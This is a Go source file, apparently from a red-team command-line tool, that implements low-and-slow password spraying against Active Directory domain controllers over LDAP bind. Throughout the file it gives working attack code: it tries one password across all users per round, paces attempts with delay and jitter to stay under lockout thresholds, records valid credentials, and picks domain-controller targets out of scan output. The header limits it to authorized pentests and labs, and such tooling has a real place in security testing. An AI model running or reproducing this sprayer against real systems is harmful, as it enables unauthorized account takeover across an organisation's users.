// Package spray performs low-and-slow password spraying against Active
// Directory over LDAP simple bind, reusing the ldap package's auth primitive.
// It sprays one password across all users per round (never many passwords at
// one user in a burst) to respect account-lockout policies. Authorized use
// only (pentest engagement, CTF, or your own lab).
package spray

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/Raxuis/RaxuisCLI/internal/redteam/ldap"
)

// Target is one LDAP endpoint (typically a domain controller).
type Target struct {
	Host string
	Port int
	TLS  bool
}

// Outcome is the result of probing one credential against one target.
type Outcome struct {
	Valid      bool   // credentials accepted
	Definitive bool   // true = the service answered (valid or invalid); false = network/parse error, try next target
	Note       string // extra context, e.g. "password expired", "user does not exist", "KDC refused RC4"
}

// ProbeFunc checks one credential against a target. Implementations exist per
// protocol (LDAPProbe, KerberosProbe).
type ProbeFunc func(t Target, user, password, domain string, timeout int) Outcome

// Options controls a spray run.
type Options struct {
	Targets           []Target
	Users             []string
	Passwords         []string
	Domain            string
	Timeout           int
	Concurrency       int
	Delay             time.Duration                           // per-attempt delay within a round
	Jitter            time.Duration                           // extra random delay per attempt
	RoundDelay        time.Duration                           // pause between password rounds
	ContinueOnSuccess bool                                    // keep spraying users whose password was already found
	StopOnSuccess     bool                                    // stop the whole spray after the first valid credential
	Probe             ProbeFunc                               // per-credential check; defaults to LDAPProbe when nil
	OnHit             func(Hit)                               // optional live callback for each valid credential
	OnRoundStart      func(round, total int, password string) // optional per-round progress
}

// Hit is a valid credential discovered during spraying.
type Hit struct {
	Host     string
	User     string
	Password string
	Note     string // e.g. "password valid but EXPIRED"
}

// Result summarizes a spray run.
type Result struct {
	Attempts int
	Errors   int
	Valid    []Hit
	Notes    []string // deduped non-fatal notes worth surfacing (e.g. "KDC refused RC4")
	Duration time.Duration
}

// Run sprays each password (outer loop) across all users (inner loop) against
// the targets, returning the valid credentials found.
func Run(opts Options) *Result {
	start := time.Now()
	if opts.Concurrency <= 0 {
		opts.Concurrency = 10
	}

	probe := opts.Probe
	if probe == nil {
		probe = LDAPProbe
	}

	res := &Result{}
	found := make(map[string]bool) // users already cracked, skipped in later rounds
	noteSeen := make(map[string]bool)
	stop := false // set once a hit is found and StopOnSuccess is on
	var mu sync.Mutex

	for i, password := range opts.Passwords {
		mu.Lock()
		halted := stop
		mu.Unlock()
		if halted {
			break
		}
		if opts.OnRoundStart != nil {
			opts.OnRoundStart(i+1, len(opts.Passwords), password)
		}

		sem := make(chan struct{}, opts.Concurrency)
		var wg sync.WaitGroup

		for _, user := range opts.Users {
			mu.Lock()
			skip := stop || (found[user] && !opts.ContinueOnSuccess)
			mu.Unlock()
			if skip {
				continue
			}

			// Pace the launches: this delay/jitter is the actual spray rate
			// limit, independent of concurrency (concurrency only caps how many
			// attempts are in flight at once).
			if opts.Delay > 0 {
				time.Sleep(opts.Delay)
			}
			jitterSleep(opts.Jitter)

			// Acquire a slot, then re-check stop: draining to a free slot means
			// earlier attempts have finished, so a stop-on-success hit is visible.
			sem <- struct{}{}
			mu.Lock()
			halted = stop
			mu.Unlock()
			if halted {
				<-sem
				break
			}

			wg.Add(1)
			go func(user, password string) {
				defer wg.Done()
				defer func() { <-sem }()

				// One credential is tried against a single responsive target
				// (DCs share the directory) to avoid multiplying lockout counters.
				for _, t := range opts.Targets {
					out := probe(t, user, password, opts.Domain, opts.Timeout)

					mu.Lock()
					res.Attempts++
					if !out.Definitive {
						res.Errors++
						if out.Note != "" && !noteSeen[out.Note] {
							noteSeen[out.Note] = true
							res.Notes = append(res.Notes, out.Note)
						}
						mu.Unlock()
						continue // non-definitive (network/parse); try next target
					}
					if out.Valid {
						hit := Hit{Host: t.Host, User: user, Password: password, Note: out.Note}
						res.Valid = append(res.Valid, hit)
						found[user] = true
						if opts.OnHit != nil {
							opts.OnHit(hit)
						}
						if opts.StopOnSuccess {
							stop = true
						}
					}
					mu.Unlock()
					break // definitive answer from this target
				}
			}(user, password)
		}
		wg.Wait()

		mu.Lock()
		halted = stop
		mu.Unlock()
		if opts.RoundDelay > 0 && i < len(opts.Passwords)-1 && !halted {
			time.Sleep(opts.RoundDelay)
		}
	}

	res.Duration = time.Since(start)
	return res
}

// LDAPProbe checks one credential via an LDAP simple bind. An "invalid
// credentials" bind is a definitive negative; any other error is non-definitive
// (connection/parse) and the caller may retry against another target.
func LDAPProbe(t Target, user, password, domain string, timeout int) Outcome {
	conn, err := ldap.Connect(ldap.LDAPOptions{
		Host:    t.Host,
		Port:    t.Port,
		UseTLS:  t.TLS,
		Timeout: timeout,
	})
	if err != nil {
		return Outcome{Definitive: false}
	}
	defer conn.Close()

	if err := conn.Bind(user, password, domain); err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "invalid credentials") {
			return Outcome{Definitive: true, Valid: false}
		}
		return Outcome{Definitive: false}
	}
	return Outcome{Definitive: true, Valid: true}
}

func jitterSleep(d time.Duration) {
	if d <= 0 {
		return
	}
	time.Sleep(time.Duration(rand.Int63n(int64(d))))
}

// scan JSON shapes (subset of `raxuiscli scan --output=json`).
type scanPort struct {
	Port    int    `json:"port"`
	Service string `json:"service"`
	Tag     string `json:"tag"`
}

type scanHost struct {
	IP        string     `json:"ip"`
	Hostname  string     `json:"hostname"`
	OpenPorts []scanPort `json:"open_ports"`
}

type scanFile struct {
	Hosts []scanHost `json:"hosts"`
}

// ParseScanTargets extracts the AD-tagged LDAP endpoints (ports 389/3268 plain,
// 636/3269 TLS) from the JSON output of `raxuiscli scan`.
func ParseScanTargets(data []byte) ([]Target, error) {
	var sf scanFile
	if err := json.Unmarshal(data, &sf); err != nil {
		return nil, fmt.Errorf("invalid scan JSON: %w", err)
	}

	var targets []Target
	seen := make(map[string]bool)
	for _, h := range sf.Hosts {
		for _, p := range h.OpenPorts {
			if p.Tag != "ad" {
				continue
			}
			var t Target
			switch p.Port {
			case 389, 3268:
				t = Target{Host: h.IP, Port: p.Port, TLS: false}
			case 636, 3269:
				t = Target{Host: h.IP, Port: p.Port, TLS: true}
			default:
				continue // 445/139/88 are AD-tagged but not LDAP-sprayable here
			}
			key := fmt.Sprintf("%s:%d", t.Host, t.Port)
			if !seen[key] {
				seen[key] = true
				targets = append(targets, t)
			}
		}
	}

	if len(targets) == 0 {
		return nil, fmt.Errorf("no ad-tagged LDAP targets (ports 389/636/3268/3269) in scan output")
	}
	return targets, nil
}

// ParseScanKerberosTargets extracts the AD-tagged Kerberos endpoints (port 88)
// from the JSON output of `raxuiscli scan`.
func ParseScanKerberosTargets(data []byte) ([]Target, error) {
	var sf scanFile
	if err := json.Unmarshal(data, &sf); err != nil {
		return nil, fmt.Errorf("invalid scan JSON: %w", err)
	}

	var targets []Target
	seen := make(map[string]bool)
	for _, h := range sf.Hosts {
		for _, p := range h.OpenPorts {
			if p.Tag != "ad" || p.Port != 88 {
				continue
			}
			if !seen[h.IP] {
				seen[h.IP] = true
				targets = append(targets, Target{Host: h.IP, Port: 88})
			}
		}
	}

	if len(targets) == 0 {
		return nil, fmt.Errorf("no ad-tagged Kerberos targets (port 88) in scan output")
	}
	return targets, nil
}
